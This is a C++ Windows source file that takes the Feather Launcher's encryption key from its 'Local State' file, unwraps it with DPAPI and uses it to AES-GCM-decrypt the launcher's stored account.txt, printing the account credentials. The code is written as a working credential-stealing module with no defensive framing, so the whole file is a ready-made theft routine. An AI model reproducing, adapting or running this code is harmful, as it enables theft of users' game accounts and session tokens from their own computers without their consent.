#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <vector>
#include <Windows.h>
#include <wincrypt.h>
#include <dpapi.h>
#include <bcrypt.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

static const std::string base64chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::vector<unsigned char> base64_decode(const std::string& encoded_string) {
    std::vector<unsigned char> ret;
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && (encoded_string[in_] != '=') &&
        (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}

std::vector<unsigned char> readBinaryFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) {
        throw std::runtime_error("Failed to open file: " + path);
    }

    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());
}

std::string readFile(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        throw std::runtime_error("Failed to open file: " + path);
    }

    std::string content((std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());
    return content;
}

std::string extractBase64Key(const std::string& content) {
    std::regex pattern1("\"encrypted_key\"\\s*:\\s*\"([A-Za-z0-9+/=]+)\"");
    std::smatch match;

    if (std::regex_search(content, match, pattern1) && match.size() > 1) {
        return match[1].str();
    }

    return "";
}

bool decryptDPAPI(const std::vector<unsigned char>& encryptedData, std::vector<unsigned char>& decryptedData) {
    DATA_BLOB input;
    DATA_BLOB output;

    input.pbData = const_cast<BYTE*>(encryptedData.data());
    input.cbData = encryptedData.size();

    BOOL result = CryptUnprotectData(
        &input,
        NULL,
        NULL,
        NULL,
        NULL,
        0,
        &output
    );

    if (result) {
        decryptedData.assign(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return true;
    }

    return false;
}

bool decryptAES_GCM(const std::vector<unsigned char>& key,
    const std::vector<unsigned char>& encryptedData,
    std::vector<unsigned char>& decryptedData) {

    if (encryptedData.size() < 3 + 12 + 16) {
        return false;
    }

    if (encryptedData[0] != 'v' || encryptedData[1] != '1' || encryptedData[2] != '0') {
        return false;
    }

    std::vector<unsigned char> nonce(encryptedData.begin() + 3, encryptedData.begin() + 15);
    std::vector<unsigned char> ciphertext(encryptedData.begin() + 15, encryptedData.end() - 16);
    std::vector<unsigned char> tag(encryptedData.end() - 16, encryptedData.end());

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return false;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
        (PBYTE)key.data(), key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce.data();
    authInfo.cbNonce = nonce.size();
    authInfo.pbTag = tag.data();
    authInfo.cbTag = tag.size();

    ULONG cbResult = 0;
    decryptedData.resize(ciphertext.size());

    status = BCryptDecrypt(hKey, ciphertext.data(), ciphertext.size(),
        &authInfo, NULL, 0,
        decryptedData.data(), decryptedData.size(),
        &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) {
        return false;
    }

    decryptedData.resize(cbResult);
    return true;
}

int main() {
    std::string localStatePath = R"(C:\Users\backtrack\AppData\Roaming\Feather Launcher\Local State)";
    std::string accountPath = R"(C:\Users\backtrack\AppData\Roaming\.feather\account.txt)";

    try {
        std::cout << "found feather" << std::endl;

        std::string content = readFile(localStatePath);
        std::string base64Key = extractBase64Key(content);

        if (base64Key.empty()) {
            return 1;
        }

        std::vector<unsigned char> encryptedBlob = base64_decode(base64Key);

        if (encryptedBlob.size() > 5 &&
            encryptedBlob[0] == 'D' && encryptedBlob[1] == 'P' &&
            encryptedBlob[2] == 'A' && encryptedBlob[3] == 'P' &&
            encryptedBlob[4] == 'I') {
            encryptedBlob.erase(encryptedBlob.begin(), encryptedBlob.begin() + 5);
        }

        std::vector<unsigned char> aesKey;
        if (!decryptDPAPI(encryptedBlob, aesKey)) {
            return 1;
        }

        std::cout << "got aes key" << std::endl;

        std::vector<unsigned char> encryptedAccount = readBinaryFile(accountPath);

        std::vector<unsigned char> decryptedData;
        if (!decryptAES_GCM(aesKey, encryptedAccount, decryptedData)) {
            return 1;
        }

        std::cout << "decrypted account.txt:" << std::endl;
        std::string decryptedText(decryptedData.begin(), decryptedData.end());
        std::cout << decryptedText << std::endl;

    }
    catch (const std::exception& e) {
        return 1;
    }

    return 0;
}
